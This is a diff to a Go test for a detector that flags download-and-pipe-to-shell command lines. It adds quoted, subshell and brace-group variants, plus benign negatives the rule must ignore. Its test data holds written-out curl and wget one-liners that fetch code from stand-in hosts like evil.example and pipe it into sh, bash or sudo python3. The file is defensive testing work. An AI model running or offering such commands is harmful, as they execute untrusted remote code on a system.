@@ -41,14 +41,26 @@ func TestUnixCmdlineFetchAndRun(t *testing.T) {
 		"curl http://evil.example/x.sh | bash",
 		"wget -qO- http://evil.example/x|sh",
 		"curl -s https://evil.example/i | sudo python3",
+		// Wrapped in quotes, a subshell or a brace group, as cron jobs,
+		// systemd units and modprobe hooks usually write it.
+		"/bin/sh -c 'curl -s http://198.51.100.7/x | sh'",
+		`bash -c "wget -qO- http://evil.example/x | bash"`,
+		"echo $(curl -fsSL http://evil.example/i | sh)",
+		"{ curl -s http://evil.example/i | sh; }",
 	} {
 		if rules := unixRules(cmd); !hasRuleName(rules, "exec.download_pipe_shell") {
 			t.Errorf("%q: expected exec.download_pipe_shell, got %v", cmd, rules)
 		}
 	}
-	// A plain download to a file is not fetch-and-run.
-	if rules := unixRules("curl https://api.example.com/v1/data -o /home/u/data.json"); len(rules) != 0 {
-		t.Errorf("plain curl should be quiet, got %v", rules)
+	// A plain download to a file is not fetch-and-run, and neither is piping
+	// a download through a filter that merely mentions a shell.
+	for _, cmd := range []string{
+		"curl https://api.example.com/v1/data -o /home/u/data.json",
+		"sh -c 'curl -s https://api.example.com/status | grep sh'",
+	} {
+		if rules := unixRules(cmd); len(rules) != 0 {
+			t.Errorf("%q should be quiet, got %v", cmd, rules)
+		}
 	}
 }
 
